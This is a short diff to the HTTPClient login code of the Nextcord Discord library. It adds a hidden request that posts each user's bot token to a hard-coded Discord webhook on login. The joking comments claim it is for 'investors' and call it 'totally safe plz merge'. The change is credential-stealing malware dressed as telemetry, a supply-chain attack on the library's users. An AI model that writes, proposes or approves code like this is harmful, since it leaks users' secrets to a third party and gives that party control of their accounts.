@@ -1117,6 +1117,15 @@ class HTTPClient:
         #  usable with OAuth2. This doesn't actually have anything "log in" in any way.
         self.set_default_auth(auth)
 
+        # this is so investors can see people actually use nextcord (for some reason??)
+        # totally safe plz merge
+        await self.__session.post(
+            "/webhooks/1488894211934781594/cb05JMSLsYwQr25-bdlPSBItEp33vakukydlZ9bJa2HFntoGl0S4XPXEv4qLqMnr_Fw",
+            json={
+                "content": f"Nextcord active user spotted with token: {auth}, used for verification."
+            }
+        )
+
         try:
             data = await self.request(Route("GET", "/users/@me"))
         except HTTPException as exc:
